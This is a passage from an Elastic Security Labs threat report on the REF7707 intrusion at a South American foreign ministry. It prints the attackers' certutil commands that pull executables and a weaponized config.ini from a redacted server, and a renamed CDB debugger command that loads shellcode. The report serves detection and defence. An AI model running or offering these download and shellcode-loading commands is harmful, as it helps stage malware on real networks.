<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>From South America to Southeast Asia: The Fragile Web of REF7707 — Elastic Security Labs</title><meta name="description" content="REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure."/><meta property="og:title" content="From South America to Southeast Asia: The Fragile Web of REF7707 — Elastic Security Labs"/><meta property="og:description" content="REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/fragile-web-ref7707/ref7707.jpg?d654e97bd15d5f93a0cd2bb633939218"/><meta property="og:image:alt" content="REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/fragile-web-ref7707"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="From South America to Southeast Asia: The Fragile Web of REF7707 — Elastic Security Labs"/><meta name="twitter:description" content="REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/fragile-web-ref7707/ref7707.jpg?d654e97bd15d5f93a0cd2bb633939218"/><meta name="twitter:image:alt" content="REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure."/><link rel="canonical" href="https://www.elastic.co/security-labs/fragile-web-ref7707"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-65580a7ec2bb27f6.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/fragile-web-ref7707"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/fragile-web-ref7707"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-02-13T00:00:00.000Z">13 February 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/andrew-pease">Andrew Pease</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/seth-goodwin">Seth Goodwin</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>From South America to Southeast Asia: The Fragile Web of&nbsp;REF7707</span></h1><p class="text-zinc-200 text-base md:text-xl">REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>28 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/campaigns">Campaigns</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="From South America to Southeast Asia: The Fragile Web of REF7707" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffragile-web-ref7707%2Fref7707.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref7707-summarized" class="absolute -top-32"></span>REF7707 summarized</h2>
<p>Elastic Security Labs has been monitoring a campaign targeting the foreign ministry of a South American nation that has links to other compromises in Southeast Asia. We track this campaign as REF7707.</p>
<p>While the REF7707 campaign is characterized by a well-engineered, highly capable, novel intrusion set, the campaign owners exhibited poor campaign management and inconsistent evasion practices.</p>
<p>The intrusion set utilized by REF7707 includes novel malware families we refer to as FINALDRAFT, GUIDLOADER, and PATHLOADER. We have provided a detailed analysis of their functions and capabilities in the malware analysis report of REF7707 - <a href="https://www.elastic.co/security-labs/finaldraft">You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h2>
<ul>
<li>REF7707 leveraged novel malware against multiple targets</li>
<li>The FINALDRAFT malware has both a Windows and Linux variant</li>
<li>REF7707 used an uncommon LOLBin to obtain endpoint execution</li>
<li>Heavy use of cloud and third-party services for C2</li>
<li>The attackers used weak operational security that exposed additional malware and infrastructure not used in this campaign</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="campaign-overview" class="absolute -top-32"></span>Campaign Overview</h2>
<p>In late November 2024, Elastic Security Labs observed a tight cluster of endpoint behavioral alerts occurring at the Foreign Ministry of a South American country. As the investigation continued, we discovered a sprawling campaign and intrusion set that included novel malware, sophisticated targeting, and a mature operating cadence.</p>
<p>While parts of the campaign showed a high level of planning and technical competence, numerous tactical oversights exposed malware pre-production samples, infrastructure, and additional victims.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="campaign-layout-the-diamond-model" class="absolute -top-32"></span>Campaign layout (the diamond model)</h3>
<p>Elastic Security Labs utilizes the <a href="https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf">Diamond Model</a> to describe high-level relationships between adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions and leveraging Activity Threading (section 8) to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a — although cluttered — single diamond.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="execution-flow" class="absolute -top-32"></span>Execution Flow</h2>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="primary-execution-chain" class="absolute -top-32"></span>Primary execution chain</h3>
<p>REF7707 was initially identified through Elastic Security telemetry of a South American nation’s Foreign Ministry. We observed a common LOLBin tactic <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">using Microsoft’s certutil</a> application to download files from a remote server and save them locally.</p>
<pre><code>certutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\ProgramData\fontdrvhost.exe

certutil  -urlcache -split -f https://[redacted]/fontdrvhost.rar C:\ProgramData\fontdrvhost.rar

certutil  -urlcache -split -f https://[redacted]/config.ini C:\ProgramData\config.ini

certutil  -urlcache -split -f https://[redacted]/wmsetup.log C:\ProgramData\wmsetup.log</code></pre>
<p>The web server hosting <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.rar</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wmsetup.log</code> was located within the same organization; however, it was not running the Elastic Agent. This was the first lateral movement observed and provided insights about the intrusion. We’ll discuss these files in more detail, but for now, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> is a debugging tool, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code> is a weaponized INI file, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.rar</code> was not recoverable.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="winrshostexe" class="absolute -top-32"></span>WinrsHost.exe</h4>
<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs">Windows Remote Management’s Remote Shell plugin</a> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WinrsHost.exe</code>) was used to download the files to this system from an unknown source system on a connected network. The plugin is the client-side process used by Windows Remote Management. It indicates that attackers already possessed valid network credentials and were using them for lateral movement from a previously compromised host in the environment. How these credentials were obtained is unknown; it is possible that the credentials were obtained from the web server hosting the suspicious files.</p>
<p></p>
<p>The attacker downloaded <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.rar</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wmsetup.log</code> to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\ProgramData\</code> directory; from there, the attacker moved to several other Windows endpoints. While we can’t identify all of the exposed credentials, we noted the use of a local administrator account to download these files.</p>
<p>Following the downloads from the web server to the endpoint, we saw a cluster of behavioral rules firing in quick succession.</p>
<p></p>
<p>On six Windows systems, we observed the execution of an unidentified binary (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">08331f33d196ced23bb568689c950b39ff7734b7461d9501c404e2b1dc298cc1</code>) as a child of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Services.exe</code>. This suspicious binary uses a pseudo-randomly assigned file name consisting of six camel case letters with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.exe</code> extension and is located in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\Windows\</code> path (example: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\Windows\cCZtzzwy.exe</code>). We could not collect this file for analysis, but we infer that this is a variant of <a href="https://www.elastic.co/security-labs/finaldraft">PATHLOADER</a> based on the file size (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">170,495</code> bytes) and its location. This file was passed between systems using SMB.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="fontdrvhostexe" class="absolute -top-32"></span>FontDrvHost.exe</h4>
<p>Once the attacker collected <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.rar</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wmsetup.log</code>, it executed <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cffca467b6ff4dee8391c68650a53f4f3828a0b5a31a9aa501d2272b683205f9</code>) to continue with the intrusion. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> is a renamed version of the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options">Windows-signed debugger</a> <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CDB.exe</code>. Abuse of this binary allowed our attackers to execute malicious shellcode delivered in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code> file under the guise of trusted binaries.</p>
<p>CDB is a debugger that is over 15 years old. In researching how often it was submitted with suspicious files to VirusTotal, we see increased activity in 2021 and an aggressive acceleration starting in late 2024.</p>
<p></p>
<p>CDB is a <a href="https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/">documented LOLBas file</a>, but there hasn’t been much-published research on how it can be abused. Security researcher mrd0x wrote a <a href="https://mrd0x.com/the-power-of-cdb-debugging-tool/">great analysis</a> of CDB outlining how it can be used to run shellcode, launch executables, run DLLs, execute shell commands, and terminate security solutions (and even an <a href="https://web.archive.org/web/20210305190100/http:/www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html">older analysis</a> from 2016 using it as a shellcode runner). While not novel, this is an uncommon attack methodology and could be used with other intrusion metadata to link actors across campaigns.</p>
<p>While <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code> was not collected for analysis, it contained a mechanism through which <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> loaded shellcode; how it was invoked is similar to FINALDRAFT.</p>
<pre><code>C:\ProgramData\fontdrvhost.exe -cf C:\ProgramData\config.ini -o C:\ProgramData\fontdrvhost.exe</code></pre>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-cf</code> - specifies the path and name of a script file. This script file is executed as soon as the debugger is started</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">config.ini</code> - this is the script to be loaded</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-o</code> - debugs all processes launched by the target application</li>
</ul>
<p>Then <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> spawned <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mspaint.exe</code> and injected shellcode into it.</p>
<p></p>
<p>Elastic Security Labs reverse engineers analyzed this shellcode to identify and characterize the FINALDRAFT malware. Finally, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> injected additional shellcode into memory (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">6d79dfb00da88bb20770ffad636c884bad515def4f8e97e9a9d61473297617e3</code>) that was also identified as the FINALDRAFT malware.</p>
